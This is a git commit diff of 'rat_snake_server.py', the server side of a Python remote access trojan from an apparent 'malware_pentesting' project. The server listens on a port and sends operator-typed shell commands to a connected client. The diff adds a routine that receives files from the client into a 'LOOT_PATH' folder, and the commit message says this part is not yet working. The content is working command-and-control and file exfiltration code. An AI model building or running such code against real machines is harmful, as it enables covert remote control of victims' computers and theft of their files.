79e5cd62d5fac25b9ef4718012ddd1a39afb906a
CWright2022 <61096126+CWright2022@users.noreply.github.com>
2023-01-04 17:11:00 -0500

    attempting to add file transfer - not currently working

--- rat_snake_server.py
+++ rat_snake_server.py
@@ -8,6 +8,8 @@ import socket
 
 HOST = "0.0.0.0"  # IP to listen on
 PORT = 1234  # port to listen on
+ENCODING = 'utf-8'
+LOOT_PATH = "C:\\Users\\minds\\Code\\malware_pentesting\\"
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.bind((HOST, PORT))
@@ -15,21 +17,36 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     conn, addr = s.accept()
     with conn:
         print(f"Connected by {addr}")
-        client_working_directory = conn.recv(1024).decode('utf-8')
+        client_working_directory = conn.recv(1024).decode(ENCODING)
         while True:
             # get command to run
             print()
             command = input(f"{client_working_directory} $> ")
-            # exit case
-            if command == ("exit"):
-                exit()
             # send command
-            command = command.encode('utf-8')
+            command = command.encode(ENCODING)
             conn.sendall(command)
+
+
+
             # get result
-            recieved_output = conn.recv(1024)
-            print(recieved_output.decode('utf-8'))
-            if recieved_output.decode('utf-8') == "client_stopped":
+            recieved_output = conn.recv(1024).decode(ENCODING)
+            print(recieved_output)
+            #handle client stopped
+            if recieved_output == "special:client_stopped":
+                print("Client has been terminated.")
                 break
+            #handle file transfer
+            if recieved_output [:20] == "special:recieve_file":
+                print("got special file transfer message")
+                with open(LOOT_PATH+recieved_output[21:],"wb") as file:
+                    print("opened file")
+                    buffer = conn.recv(1024)
+                    print("got initial buffer")
+                    while buffer:
+                        file.write(buffer)
+                        print("wrote buffer to file")
+                        buffer = conn.recv(1024)
+                        print("recieved from socket")
+                print("all done")
             #recieve client working directory
-            client_working_directory = conn.recv(1024).decode('utf-8')
+            client_working_directory = conn.recv(1024).decode(ENCODING)
